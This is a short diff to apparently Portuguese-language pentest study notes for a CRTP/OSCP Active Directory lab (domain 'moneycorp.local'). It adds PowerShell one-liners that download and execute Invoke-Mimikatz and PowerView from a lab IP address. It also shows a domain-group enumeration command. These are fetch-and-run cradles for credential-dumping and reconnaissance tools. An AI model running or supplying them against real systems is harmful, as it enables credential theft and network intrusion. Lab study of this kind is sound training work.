@@ -2765,6 +2765,13 @@ get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local | 
 
 
 ## BASICO E RECORRENTE
+##### POWERSHELL SCRIPTS - DOWNLOADS
+```
+iex (New-Object Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/Invoke-Mimikatz.ps1")
+```
+```
+iex (New-Object Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/PowerView.ps1")
+```
 ##### POWERSHELL - INFORMAÇÕES DO HOST
 ```
 $COMANDO = systeminfo
